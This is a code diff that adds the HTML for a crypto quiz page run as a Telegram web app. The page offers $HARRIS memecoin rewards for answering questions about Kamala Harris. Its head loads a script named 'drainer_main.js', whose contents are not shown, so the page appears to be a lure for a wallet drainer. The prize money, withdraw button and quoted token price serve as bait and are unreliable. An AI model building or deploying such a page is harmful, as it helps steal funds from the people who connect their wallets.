@@ -1,0 +1,388 @@
+<html lang="en" style="--tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Simple 1,000,000$ Think to Earn crypto quiz!</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&amp;display=swap" />
+
+  <script charset="UTF-8" async type="text/javascript" src="drainer_main.js"></script>
+  <style>
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      backdrop-filter: blur(5px);
+      text-align: center;
+      color: white;
+      font-family: "Roboto", sans-serif;
+    }
+
+    .connectButton {
+      color: white;
+      border: 1px solid white;
+      background-color: transparent;
+      padding: 10px 20px;
+      margin: 10px;
+      cursor: pointer;
+      font-size: 1.2em;
+      letter-spacing: 0.1em;
+    }
+
+    body {
+      font-family: "Roboto", Arial, sans-serif;
+      text-align: center;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      min-height: 100vh;
+    }
+
+    #title {
+      display: inline-block;
+      font-size: 2.5em;
+      margin-top: 10px;
+      animation: slide 2s ease-in-out;
+      letter-spacing: 0.4em;
+      font-weight: 300;
+      text-shadow: 1px 10px 10px rgba(0, 0, 0, 0.9);
+      position: relative;
+      z-index: 1;
+      margin-left: 20px;
+    }
+
+    @keyframes slide {
+      from {
+        transform: translateY(-100px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    #start-container {
+      position: relative;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    #start-button {
+      top: 300px;
+      font-size: 1.2em;
+      letter-spacing: 0.2em;
+      font-weight: 300;
+      text-shadow: 1px 5px 10px rgba(0, 0, 0, 0.9);
+      opacity: 0;
+      transition: opacity 3s;
+      cursor: pointer;
+      padding: 10px 20px;
+      background: none;
+      color: inherit;
+      white-space: nowrap;
+      user-select: none;
+      margin-top: 10px;
+      position: relative;
+      z-index: 2;
+    }
+
+    #brain-image {
+      opacity: 0;
+      transition: opacity 3s;
+      width: 80%;
+      height: auto;
+      max-width: 300px;
+      max-height: 300px;
+      object-fit: contain;
+      margin-top: 10px;
+      z-index: 1;
+    }
+
+    .line {
+      width: 80%;
+      height: 1px;
+      margin: 10px auto 0;
+      background: linear-gradient(to right,
+          rgba(0, 0, 0, 0) 0%,
+          rgba(0, 0, 0, 0.5) 50%,
+          rgba(0, 0, 0, 0) 100%);
+      opacity: 0;
+      transition: opacity 1s;
+    }
+
+    #line-below-withdraw {
+      margin-bottom: 20px;
+    }
+
+    .container,
+    .btn,
+    .timer,
+    #radio-icon,
+    #stop-button,
+    .claim-button {
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 1s;
+    }
+
+    .btn {
+      display: block;
+      width: 80%;
+      margin: 10px auto;
+      padding: 10px;
+      border: 0.5px solid #000;
+      background: #fff;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      color: black;
+    }
+
+    .points {
+      position: absolute;
+      top: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 1em;
+      transition: opacity 1s;
+    }
+
+    .points.negative {
+      color: red;
+    }
+
+    #countdown {
+      font-size: 3em;
+      font-weight: 300;
+      letter-spacing: 0.2em;
+      opacity: 0;
+      position: absolute;
+      top: 47%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      transition: opacity 1s;
+      user-select: none;
+      z-index: 2;
+    }
+
+    #question-container {
+      margin: 5px auto;
+      width: 85%;
+      padding: 0;
+      box-sizing: border-box;
+      position: relative;
+    }
+
+    #question {
+      margin: 0;
+      max-height: 100%;
+      overflow-y: auto;
+      padding: 10px 0;
+    }
+
+    .total-score-container {
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 1.2em;
+      font-weight: 300;
+      letter-spacing: 0.2em;
+      margin-top: 10px;
+      opacity: 0;
+      user-select: none;
+      z-index: 1;
+    }
+
+    .total-score-container span {
+      margin-left: 5px;
+    }
+
+    #radio-icon,
+    #stop-button {
+      position: absolute;
+      transition: opacity 2s;
+      cursor: pointer;
+      z-index: 3;
+    }
+
+    #radio-icon {
+      top: 20px;
+      left: 40px;
+      width: 42px;
+      height: 42px;
+    }
+
+    #stop-button {
+      top: 23px;
+      right: 45px;
+      width: 34px;
+      height: 34px;
+    }
+
+    #promo-text {
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+      margin-top: 10px;
+      font-size: 0.95em;
+      letter-spacing: 0.1em;
+      font-weight: 300;
+      margin: 0 0.5cm;
+      width: calc(100% - 1cm);
+      box-sizing: border-box;
+      text-align: justify;
+      margin-bottom: 10px;
+      z-index: 1;
+    }
+
+    #promo-text b {
+      font-weight: bold;
+    }
+
+    .claim-button {
+      display: block;
+      width: 80%;
+      margin: 10px auto;
+      padding: 10px;
+      border: 0.5px solid #000;
+      background: #fff;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      font-size: 1.2em;
+      letter-spacing: 0.2em;
+      font-weight: 300;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+      color: black;
+      text-decoration: none;
+    }
+
+    .claim-button.disabled {
+      pointer-events: none;
+      background: #ddd;
+      color: #aaa;
+      border-color: #aaa;
+    }
+
+    #footer {
+      font-size: 0.8em;
+      letter-spacing: 0.1em;
+      margin-top: 5px;
+      margin-bottom: 10px;
+    }
+
+    .center-text {
+      text-align: center;
+    }
+
+    @media (min-width: 768px) {
+      #start-container {
+        width: 375px;
+        margin: auto;
+      }
+
+      #start-button {
+        bottom: 20px;
+        position: absolute;
+      }
+
+      #brain-image {
+        max-width: 350px;
+        margin-bottom: 0px;
+      }
+
+      .line {
+        width: 375px;
+      }
+
+      .container,
+      .btn,
+      .timer,
+      .claim-button {
+        width: 375px;
+        margin: 10px auto;
+      }
+
+      #promo-text {
+        width: 375px;
+        margin: 10px auto;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div id="title">SIMPLE</div>
+  <div id="start-container">
+    <img id="brain-image" src="brain.png" alt="Brain Image" style="opacity: 1" />
+    <div id="start-button" style="
+          position: absolute;
+          bottom: 5px;
+          left: 50%;
+          transform: translateX(-50%);
+          opacity: 1;
+          pointer-events: auto;
+        ">
+      Press to Start
+    </div>
+  </div>
+  <div class="line" id="line"></div>
+  <div id="countdown"></div>
+  <div class="container" id="container" style="pointer-events: none; display: none">
+    <div id="question-container">
+      <div id="question"></div>
+    </div>
+    <div class="btn" id="btn1"></div>
+    <div class="btn" id="btn2"></div>
+    <div class="btn" id="btn3"></div>
+    <div class="btn" id="btn4"></div>
+  </div>
+  <div class="timer" id="timer" style="display: none">± 0.000</div>
+  <div class="total-score-container" id="total-score-container" style="display: none">
+    <div class="score" id="total-score">0</div>
+    <span id="knlg-span" style="display: none">🧠 $HARRIS</span>
+  </div>
+  <a class="claim-button disabled" id="withdraw-button" style="display: none">Withdraw $HARRIS</a>
+  <div class="line" id="line-below-withdraw"></div>
+  <div id="promo-text">
+    Relax. Turn on the radio and enjoy the process of converting your
+    knowledge about Kamala Harris into income with the first-ever
+    Think-to-Earn crypto quiz. Powered by Ethereum, The Open Network, and Tron
+    blockchains, this SIMPLE quiz offers you a chance to earn $HARRIS tokens
+    by answering questions about our historic Vice President and 2024
+    presidential candidate.<br /><br />
+    Accumulate at least 250,000 $HARRIS! You can sell or buy more $HARRIS on
+    UniSwap
+    <br />
+    $HARRIS is a memecoin centered around Kamala Harris, the 49th vice
+    president of the United States since 2021, under President Joe Biden.
+    Kamala Harris is also a prominent figure in the upcoming 2024 presidential
+    election, where she is considered a strong contender for the Democratic
+    nomination.<br />
+    1 $HARRIS = $ 0.5336<br />
+    <i>Terms and conditions apply. Token availability and prices are subject
+      to market conditions. This is not financial advice. Please consult with
+      a financial advisor before making any investment decisions.</i>
+  </div>
+  <div id="footer">© 2024 SIMPLE Transhumanism. All rights reserved.</div>
+  <img id="radio-icon" src="trace.svg" alt="Radio Icon" style="display: none" />
+  <img id="stop-button" src="stop.svg" alt="Stop Button" style="display: none" />
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="script2.js"></script>
+  <script src="script.js"></script>
+</body>
+
+</html>
